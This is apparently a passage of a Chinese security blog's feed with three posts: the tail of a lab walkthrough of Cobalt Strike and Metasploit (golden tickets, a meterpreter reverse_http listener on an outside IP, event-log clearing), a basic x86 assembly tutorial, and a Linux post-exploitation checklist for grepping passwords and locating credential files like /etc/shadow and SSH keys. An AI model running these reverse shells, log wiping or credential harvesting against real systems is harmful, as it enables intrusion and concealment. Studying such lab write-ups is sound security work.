src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0NTIucG5n?x-oss-process=image/format,png" alt="image-20200328124712214"></p><p>制造黄金票据</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0NTMucG5n?x-oss-process=image/format,png" alt="image-20200328122338474"></p><p>可以运行</p><p><img src="https://gitee.com/godzeo/blogimg/raw/master/img/20200602100454.png" alt="image-20200328124627029"></p><h3 id="清除票据"><a href="#清除票据" class="headerlink" title="清除票据"></a>清除票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br></pre></td></tr></table></figure><h1 id="0x06-通道的构建"><a href="#0x06-通道的构建" class="headerlink" title="0x06 通道的构建"></a>0x06 通道的构建</h1><h3 id="会话的派生"><a href="#会话的派生" class="headerlink" title="会话的派生"></a>会话的派生</h3><p>打开msf监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_http</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost x.x.x.x</span><br><span class="line">lhost &#x3D;&gt; x.x.x.x</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 6668</span><br><span class="line">lport &#x3D;&gt; 6668</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure><p>msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http<br>payload =&gt; windows/meterpreter/reverse_http<br>msf5 exploit(multi/handler) &gt; set lhost<br>set lhost 127.0.0.1 set lhost eth0<br>set lhost 172.21.0.4 set lhost fe80::5054:ff:fe89:7f0f%eth0<br>set lhost ::1 set lhost lo<br>msf5 exploit(multi/handler) &gt; set lhost 49.233.129.171<br>lhost =&gt; 49.233.129.171<br>msf5 exploit(multi/handler) &gt; set lport 6668<br>lport =&gt; 6668<br>msf5 exploit(multi/handler) &gt; run</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MDIxMDA0NTUucG5n?x-oss-process=image/format,png" alt="image-20200328171237582"></p><h3 id="CS搭建SOCKS代理都说不稳，所以转到MSF上"><a href="#CS搭建SOCKS代理都说不稳，所以转到MSF上" class="headerlink" title="CS搭建SOCKS代理都说不稳，所以转到MSF上"></a><strong>CS搭建SOCKS代理都说不稳，所以转到MSF上</strong></h3><h1 id="0x07清除日志"><a href="#0x07清除日志" class="headerlink" title="0x07清除日志"></a>0x07清除日志</h1><p>推荐脚本用奇安信A-Team写的脚本</p><p>链接：<a href="https://github.com/QAX-A-Team/EventLogMaster" target="_blank" rel="noopener">https://github.com/QAX-A-Team/EventLogMaster</a></p><h1 id="0x08-小结"><a href="#0x08-小结" class="headerlink" title="0x08 小结"></a>0x08 小结</h1><ul><li>思路参考 <strong>记一次在Vulnstack ATT&amp;CK 5 靶场中使用CobaltStrike的渗透之旅</strong></li><li>文章中如有错误的地方望大佬指正。</li><li>菜鸡文章望大佬勿喷。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>二进制安全-汇编基础</title>
      <link href="/2020/06/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
      <url>/2020/06/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="进制的定义"><a href="#进制的定义" class="headerlink" title="进制的定义"></a>进制的定义</h1><p>二进制：由两个符号组成，分别是0 、1</p><p>八进制：由八个符号组成，分别是0、1、2、3、4、5、6、7</p><p>十进制：由十个符号组成，分别是0、1、2、3、4、5、6、7、8、9</p><p>十六进制：由十六个符号组成，分别是0、1、2、3、4、5、6、7、8、9、A、B、C、D、E、F</p><h2 id="度量单位"><a href="#度量单位" class="headerlink" title="度量单位:"></a>度量单位:</h2><p>1byte 字节 = 8 bit 比特 char</p><p>WORD = 2 BYTE = 16 bit short int</p><p>DWORD = 4 BYTE = 32 bit</p><p>QWORD = 8 BYTE = 64 bit</p><p>1kb = 1024 byte = 8192 bit</p><p>1mb = 1024 kb</p><p>1gb = 1024 mb</p><p>1tb = 1024 gb</p><table><thead><tr><th></th><th>有符号</th><th>无符号</th></tr></thead><tbody><tr><td>byte</td><td>-128-127</td><td>0-255</td></tr><tr><td>word</td><td>-32768-32767</td><td>0-65535</td></tr><tr><td>DWORD</td><td></td><td></td></tr><tr><td>qword</td><td></td><td></td></tr></tbody></table><p>16位汇编：实模式，16位处理器内的内部，最多可以处理存储的长度为16位。</p><p>32位汇编：保护模式，32位处理器内的内部，最多可以处理存储的长度为32位。</p><p>64位汇编：保护模式，64位处理器的内部，最多可以处理存储的长度位64位。</p><table><thead><tr><th>位数</th><th>通用寄存器</th><th>扩展</th></tr></thead><tbody><tr><td>16位通用寄存器</td><td>AX、BX、 CX、 DX、 SI、 DI、 BP、 SP</td><td>R8W、R9W、R10W、R11W、R12W、 R13W、R14W、R15W</td></tr><tr><td>32位通用寄存器</td><td>EAX、EBX、ECX、EDX、ESI、EDI、EBP、ESP</td><td>R8D、R9D、R10D、R11D、R12D、 R13D、R14D、R15D</td></tr><tr><td>64位通用寄存器</td><td>RAX、RBX、RCX、RDX、RSI、RDI、RBP、RSP</td><td>R8、R9、R10、R11、R12、 R13、R14、R15</td></tr></tbody></table><h2 id="32位-常用寄存器"><a href="#32位-常用寄存器" class="headerlink" title="32位 常用寄存器"></a>32位 常用寄存器</h2><p>8个通用寄存器</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTAxODEzMDAucG5n?x-oss-process=image/format,png" alt="image-20200510181300829"></p><p>8个通用寄存器：</p><p>EAX 是”累加器”(accumulator)，操作数和结果数据累加器，返回值运算结果一般都存储在这里</p><p>EBX 是”基地址”(base)寄存器, 在内存寻址时存放基地址。</p><p>ECX 是计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</p><p>EDX 是（destination） 用于存储部分乘法结果和部分除法被除数</p><p>edi 目标索引寄存器（destination index）: 字符串操作的目标指针，ES段的数据指针</p><p>esi 源索引寄存器（source index）：字符串操作的源指针，SS段的数据指针</p><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向<br>系统栈最上面一个栈帧的栈顶。<br>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向<br>系统栈最上面一个栈帧的底部</p><p>其中一部分还可以拆开处理</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTAxODIxNDIucG5n?x-oss-process=image/format,png" alt="image-20200510182142575"></p><p>EIP：指令寄存器(Extended Instruction Pointer)，其内存放着一个指针，该指针永远指向下<br>一条等待执行的指令地址</p><p>可以说如果控制了 EIP 寄存器的内容，就控制了进程——我们让 EIP 指向哪里，CPU 就会<br>去执行哪里的指令</p><p>XMM寄存器：（浮点寄存器）</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTAxODIyNTMucG5n?x-oss-process=image/format,png" alt="image-20200510182253226"></p><p>EFLAGS寄存：包含了独立的二进制位，用于控制CPU操作，或是反应一些CPU操作的结果。有些指令可以测试和控制这些单独的处理器标识位。</p><p>EFLAGS寄存器的状态标志(0、2、4、6、7以及11位)指示算术指令（如ADD, SUB, MUL以及DIV指令）的结果，这些状态标志的作用如下：</p><h2 id="内部数据类型"><a href="#内部数据类型" class="headerlink" title="内部数据类型"></a>内部数据类型</h2><p>整数</p><ul><li>BYTE 8位</li><li>SBYTE 8位 有符号</li><li>WORD 16位 符号</li><li>SWORD 16位 有符号</li><li>DWORD 32位 符号</li><li>SDWORD 32位 有符号</li><li>FWORD 48位 保护模式的远指针</li><li>QWORD 64位 整数</li><li>TBYTE 80位 整数</li></ul><p>实数</p><ul><li>REAL4 32位 短实数</li><li>REAL8 64位 长实数</li><li>REAL10 80位 扩展实数</li></ul><p>伪指令</p><ul><li>db 8位整数 =char 可以保持ascll码</li><li>dw 16位整数</li><li>dd 32位整数</li></ul><h2 id="大端序和小端序"><a href="#大端序和小端序" class="headerlink" title="大端序和小端序"></a>大端序和小端序</h2><p>首先还是先看下基本概念：</p><p>1、大端模式：高字节保存在内存的低地址</p><p>2、小端模式：高字节保存在内存的高地址</p><p>mov arr,01234567h</p><p>存储</p><p>大端序：01 23 45 67</p><p>小端序：67 45 23 01</p><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><h3 id="算数运算"><a href="#算数运算" class="headerlink" title="算数运算"></a>算数运算</h3><h4 id="加"><a href="#加" class="headerlink" title="加"></a>加</h4><p>格式：ADD OPRD1,OPRD2</p><p>功能：两数相加</p><p>加法指令运算的结果对CF、SF、OF、PF、ZF、AF都会有影响</p><p>不允许OPRD1与OPRD2同时为存储器</p><p>————————————————————————————————</p><p>带进位加法指令ADC</p><p>格式：ADC OPRD1,OPRD2</p><p>功能：OPRD1 = OPRD1 + OPRD2 + CF</p><h4 id="减"><a href="#减" class="headerlink" title="减"></a>减</h4><p>减法指令SUB<br>格式：SUB OPRD1,OPRD2</p><p>功能：两个操作数的相减，即从OPRD1减去OPRD2，其结果放在OPRD1中，指令的类型及标识位的影响与ADD指令相同，注意立即数不能用于目的操作数，两个存储器操作数之间不能直接相减，操作数可为8位或16位的无符号数或符号数</p><p>————————————————————————————————</p><p>带错位减法指令SBB</p><p>格式：SBB OPRD1,OPRD2</p><p>功能：进行两个操作数的相减再减去CF进位标志位，即从OPRD1 = OPRD1 - OPRD2 - CF,其结果放在OPRD1中</p><h4 id="乘"><a href="#乘" class="headerlink" title="乘"></a>乘</h4><p>无符号数指令MUL</p><p>格式：MUL OPRD</p><p>两个相乘数，要么都是8位，要么都是16位。 8位乘法，16位乘法。</p><p>如果是8位，一个数字默认存放在al中，另外一个数字存放在其他8位寄存器中或者字节型内存单元中。</p><p>mul 8位寄存器 ;结果存放在ax中</p><p>如果是16位，一个数字默认存放在ax中，另外一个数字存放在其他16位寄存器中或者字型内存单元中。</p><p>mul 16位寄存器 ;结果存放在dx, ax中</p><p>8位乘法,得到一个16位数， 结果存放在ax中</p><p>16位乘法，得到一个32位数， 低16位存放在ax中，高16位存放在dx中————————————————————————————————<br>带符号数指令IMUL</p><p>功能：乘法操作</p><p>OPRD为通用寄存器或存储器操作数</p><p>本指令会影响标志位CF及OF</p><h4 id="除"><a href="#除" class="headerlink" title="除"></a>除</h4><p>无符号数除法指令DIV</p><p>格式：DIV OPRD</p><p>功能：实现两个无符号二进制数除法运算</p><p>div指令是除法指令。100001/100，100001是被除数，100是除数。一般格式为：div reg或div 内存单元，reg和内存单元存放的是除数，除数可分为8位和16为2种。</p><p>被除数：默认放在AX或DX和AX，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数 为16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。</p><p>————————————————————————————————</p><p>带符号数除法指令IDIV</p><p>格式：IDIV OPRD</p><p>功能：实现两个带符号数的二进制除法运算</p><p>比如16bit 的被除数，分别存在2个8bit寄存器AH：AL，商放在AL,余数在AH</p><p>比如32bit 的被除数，分别存在16个8bit寄存器DX：AX，商放在AX,余数在DX</p><p>比如64bit 的被除数，分别存在32个8bit寄存器EDX：EAX，商放在RAX,余数在EDX</p><p>比如128bit 的被除数，分别存在64个8bit寄存器RDX：RAX，商放在RAX,余数在RDX</p><h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p>加1指令INC(INCrement by 1)</p><p>格式：INC OPRD</p><h4 id="自减"><a href="#自减" class="headerlink" title="自减"></a>自减</h4><p>减一指令DEC(Decrement by 1)</p><p>格式：DEC OPRD</p><h3 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h3><p>循环控制指令LOOP</p><p>格式：loop 标号</p><p>功能：相当于</p><p>dec cx<br>Jnz<br>即先对cx减1，然后判cx是否为0，不为0，转后面给出标号所指的入口，为0，顺序执行</p><h3 id="MOV指令"><a href="#MOV指令" class="headerlink" title="MOV指令"></a>MOV指令</h3><p>数据传送指令 MOV</p><p>格式：MOV OPRD1,OPRD2</p><p>功能：将一个源操作数送到目的操作数中，即OPRD1&lt;–OPRD2</p><p>说明：</p><p>OPRD1为目的操作数，可以说寄存器、存储器、累加器</p><p>OPRD2为源操作数，可以数寄存器、存储器、累加器和立即数。</p><h3 id="MOVS-move-string"><a href="#MOVS-move-string" class="headerlink" title="MOVS(move string)"></a><strong>MOVS(move string)</strong></h3><p>movs指令是汇编少有的两边都可以是memory的指令，MOVS在开发中通常极有可能是一串字符串的复制</p><p>字符串传送指令MOVS</p><p>格式：MOVS OPRD1，OPRD2</p><p>功能：OPRD1&lt;—OPRD2</p><p>说明： 其中OPRD2为源串符号地址，OPRD1为目的串符号地址</p><h3 id="LEA"><a href="#LEA" class="headerlink" title="LEA"></a>LEA</h3><p>有效地址传送指令</p><p>格式：LEA OPRD1,OPRD2</p><p>功能：将源操作数给出的有效地址传送到指定的寄存器中</p><p>OPRD1必须是寄存器</p><h3 id="XCHG"><a href="#XCHG" class="headerlink" title="XCHG"></a>XCHG</h3><p>数据交换指令</p><p>格式：XCHG OPRD1,OPRD2，其中OPRD1为目的操作数，OPRD2为源操作数</p><p>功能：将两个操作数相互交换位置，该指令把源操作数OPRD2与目的操作数OPRD1交换</p><h3 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h3><p>格式：TEST OPRD1,OPRD2</p><p>功能：其中OPRD1、OPRD2的含义同AND指令一样，也是对两个操作数进行按位的‘与‘运算</p><p>不同之处：是不讲’与‘的结果送目的操作数，即本指令对两个操作数的内容均不进行修改，仅数载逻辑与操作后，对标志位重新置位</p><h3 id="CALL指令"><a href="#CALL指令" class="headerlink" title="CALL指令"></a>CALL指令</h3><p>过程调用指令</p><p>格式：CALL OPRD</p><p>功能：过程调用指令</p><p>相当于：</p><p>push eip</p><p>amp OPRD</p><h3 id="RETN指令"><a href="#RETN指令" class="headerlink" title="RETN指令"></a>RETN指令</h3><p>返回指令，相当于：</p><p>pop eip</p><p>jmp eip</p><h1 id="常用的JCC指令"><a href="#常用的JCC指令" class="headerlink" title="常用的JCC指令"></a>常用的JCC指令</h1><p>JMP：无条件跳转</p><p>JZ/JE：ZF = 1（jump When Zero和jump When Equal） 等于0或相等</p><p>JNZ（jump no Zero）与JNE（jump no Equals ） ZF=0 不等于0或者不相等</p><p>比较两个有符号数，高低用greater和less表示：</p><p>JG 前&gt;后 Jump if greater<br>JL 前&lt;后 Jump if less</p><p>JL=JNGE（jump if less,or not greater equal）</p><p>JGB和JLE是用于比较带符号数的转移指专令：</p><p>JGE 转移条件（Jump if greater or equal）：JGE al, bl ；al里的带符号内容大于或等于bl时跳转。</p><p>JLE 转移条件 （Jump if less or equal）：JLE al, bl ；al里的带符号内容小于或等于属bl时跳转。</p><p>比较两个无符号数，高低用below或者above表示：</p><p><strong>JBE/JNA(jump if below or equal,or not above)比较结果为&lt;=时转移</strong></p><p>JBE/JNA：CF = 1/ZF = 1 低于等于或者不高于跳转</p><p><strong>JNBE/JA（jump if not below or equal,or above）</strong></p><p>JNBE/JA：CF = 0 / ZF = 0 不低于等于/高于跳转</p><p>JL/JNGE：SF != OF 小于/不大于等于跳转</p><p>JNL/JGE：SF = OF 不小于/大于等于跳转</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA2MjUxODE0NDgucG5n?x-oss-process=image/format,png" alt=""></p><h1 id="栈操作指令"><a href="#栈操作指令" class="headerlink" title="栈操作指令"></a>栈操作指令</h1><p>PUSH：压栈指令，32位汇编首先ESP-4，留出一个空间，然后把要压入栈中的内容压入</p><p>POP：出栈指令，32位汇编首先将栈顶的数据弹出给指定的目标，然后ESP+4,清掉空间</p><p>在函数栈帧中，一般包含以下几类重要信息。<br>（1）局部变量：为函数局部变量开辟的内存空间。<br>（2）栈帧状态值：保存前栈帧的顶部和底部（实际上只保存前栈帧的底部，前栈帧的顶部<br>可以通过堆栈平衡计算得到），用于在本帧被弹出后恢复出上一个栈帧。<br>（3）函数返回地址：保存当前函数调用前的“断点”信息，也就是函数调用前的指令位置，<br>以便在函数返回时能够恢复到函数被调用前的代码区中继续执行指令。</p><h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><h2 id="函数调用大致包括以下几个步骤。"><a href="#函数调用大致包括以下几个步骤。" class="headerlink" title="函数调用大致包括以下几个步骤。"></a>函数调用大致包括以下几个步骤。</h2><p>（1）参数入栈：将参数从右向左依次压入系统栈中。<br>（2）返回地址入栈：将当前代码区调用指令的下一条指令地址压入栈中，供函数返回时继 续执行。<br>（3）代码区跳转：处理器从当前代码区跳转到被调用函数的入口处。<br>（4）栈帧调整：具体包括。<br>保存当前栈帧状态值，已备后面恢复本栈帧时使用（EBP 入栈）；<br>将当前栈帧切换到新栈帧（将 ESP 值装入 EBP，更新栈帧底部）；<br>给新栈帧分配空间（把 ESP 减去所需空间的大小，抬高栈顶）；<br>对于__stdcall 调用约定，函数调用时用到的指令序列大致如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">;func（a，b，c）</span><br><span class="line">;假设该函数有 3 个参数，将从右向左依次入栈  </span><br><span class="line"></span><br><span class="line">push 参数 c </span><br><span class="line">push 参数 b </span><br><span class="line">push 参数 a </span><br><span class="line">call 函数地址</span><br><span class="line"></span><br><span class="line">;call 指令将同时完成两项工作：</span><br><span class="line">;1）向栈中压入当前指令在内存中的位置，即保存返回地址。</span><br><span class="line">;2）跳转到所调用函数的入口地址函数入口处</span><br><span class="line"></span><br><span class="line">;下面是进入函数call之后：</span><br><span class="line">push ebp </span><br><span class="line">;保存旧栈帧的底部</span><br><span class="line">mov ebp，esp </span><br><span class="line">;设置新栈帧的底部（栈帧切换）</span><br><span class="line">sub esp，xxx </span><br><span class="line">;设置新栈帧的顶部（抬高栈顶，为新栈帧开辟空间）</span><br></pre></td></tr></table></figure><h2 id="函数返回的步骤如下"><a href="#函数返回的步骤如下" class="headerlink" title="函数返回的步骤如下"></a>函数返回的步骤如下</h2><p>三步：</p><p>（1）保存返回值：通常将函数的返回值保存在寄存器 EAX 中。</p><p>（2）弹出当前栈帧，恢复上一个栈帧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">具体包括： </span><br><span class="line"></span><br><span class="line">在堆栈平衡的基础上，给 ESP 加上栈帧的大小，降低栈顶，回收当前栈帧的空间。 </span><br><span class="line"></span><br><span class="line">将当前栈帧底部保存的前栈帧 EBP 值弹入 EBP 寄存器，恢复出上一个栈帧。 </span><br><span class="line"></span><br><span class="line">将函数返回地址弹给 EIP 寄存器。</span><br></pre></td></tr></table></figure><p>（3）跳转：按照函数返回地址跳回母函数中继续执行。</p><h2 id="理解图示："><a href="#理解图示：" class="headerlink" title="理解图示："></a>理解图示：</h2><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjcxNjEyMjIucG5n?x-oss-process=image/format,png" alt="image-20200527161222527"></p><h1 id="汇编练习，弹个框框"><a href="#汇编练习，弹个框框" class="headerlink" title="汇编练习，弹个框框"></a>汇编练习，弹个框框</h1><p>基础知识—-汇编代码结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.586    代表指令集</span><br><span class="line">.MODEL flat,stdcall    调用约定 内存 常用win32        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">includelib  user32.lib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.data  已经定义数据段 可读可写</span><br><span class="line">.data?  未定义的数据段 可读可写</span><br><span class="line">.code 代码段</span><br><span class="line">.const  常量数据段</span><br><span class="line">.stack  堆栈段 自动分配 可读可写可执行</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">Number DWORD 0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">text db &quot;zeo&quot;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">INVOKE MessageBox,0,offset text,0,0</span><br><span class="line">INVOKE ExitProcess,0</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTMyMzQwNTMucG5n?x-oss-process=image/format,png" alt="image-20200513234048034"></p><p>格式化输入输出（printf scanf）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.586</span><br><span class="line">.MODEL flat,stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include windows.inc</span><br><span class="line">include user32.inc</span><br><span class="line">include kernel32.inc</span><br><span class="line">include msvcrt.inc</span><br><span class="line"></span><br><span class="line">includelib user32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib msvcrt.lib</span><br><span class="line"> </span><br><span class="line">.data</span><br><span class="line">text db &quot;zeo&quot;,0</span><br><span class="line">Hello db &quot;HelleWord!&quot;,0</span><br><span class="line">szformat db &quot;%s&quot;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">main proc</span><br><span class="line">lea eax,Hello</span><br><span class="line">push eax</span><br><span class="line">push offset szformat</span><br><span class="line">call crt_scanf</span><br><span class="line">add esp,8</span><br><span class="line">push offset Hello</span><br><span class="line">;push offset szformat</span><br><span class="line">call crt_printf</span><br><span class="line">add esp,4</span><br><span class="line">call ExitProcess</span><br><span class="line">add esp,4</span><br><span class="line">main ENDP</span><br><span class="line">END main</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 二进制安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux 内网本机信息收集 速查 checklist</title>
      <link href="/2020/06/23/Linux%20%E5%86%85%E7%BD%91%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%E9%80%9F%E6%9F%A5%20checklist/"/>
      <url>/2020/06/23/Linux%20%E5%86%85%E7%BD%91%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%20%E9%80%9F%E6%9F%A5%20checklist/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>Linux 内网本机信息收集速查</p><h4 id="系统类型"><a href="#系统类型" class="headerlink" title="系统类型"></a>系统类型</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;issue</span><br><span class="line">查看系统名称</span><br></pre></td></tr></table></figure><h4 id="网络信息收集"><a href="#网络信息收集" class="headerlink" title="网络信息收集"></a>网络信息收集</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">last                                    多数运维会接入内网登录系统，这时候，便可获取部分内网ip 进而对内网IP段进行画像</span><br><span class="line">Route -n                                内网路由情况，也能为内网网络拓扑提供一定的信息</span><br><span class="line">IPtables                                防火墙情况，有时候会存在内网网络通行规则，也能提供一定信息</span><br><span class="line"></span><br><span class="line">历史命令！</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br></pre></td></tr></table></figure><h4 id="直接命令搜敏感文件收集"><a href="#直接命令搜敏感文件收集" class="headerlink" title="直接命令搜敏感文件收集"></a>直接命令搜敏感文件收集</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep &quot;password:&quot; * -Rn</span><br><span class="line">find &#x2F; -name &quot;config.*&quot;</span><br><span class="line">find &#x2F; -name &quot;databases.*&quot;</span><br><span class="line">find &#x2F; -name &quot;config.*&quot; | xargs grep &quot;password&quot;&quot;</span><br></pre></td></tr></table></figure><h4 id="常用敏感文件"><a href="#常用敏感文件" class="headerlink" title="常用敏感文件"></a>常用敏感文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_ras.keystore</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;known_hosts &#x2F;&#x2F;记录每个访问计算机用户的公钥</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;my.cnf &#x2F;&#x2F;mysql配置文件</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F;apache配置文件</span><br><span class="line">&#x2F;root&#x2F;.bash_history &#x2F;&#x2F;用户历史命令记录文件</span><br><span 